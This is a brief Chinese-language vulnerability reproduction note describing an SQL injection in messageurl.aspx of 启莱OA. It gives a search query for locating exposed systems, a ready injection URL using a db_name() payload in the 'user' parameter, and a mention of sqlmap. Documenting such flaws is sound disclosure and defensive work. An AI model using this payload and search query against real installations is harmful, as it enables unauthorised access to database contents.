# 启莱OA messageurl.aspx SQL注入漏洞

## 漏洞描述

启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

```
启莱OA
```

## 网络测绘

```
app="启莱OA"
```

## 漏洞复现

登录页面如下

![qilai-2-1](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112826211.png)

存在SQL注入的文件为 messageurl.aspx

```plain
http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1
```

![qilai-2-2](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112826212.png)

使用SQLmap对参数 user 进行注入

![qilai-2-3](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112826213.png)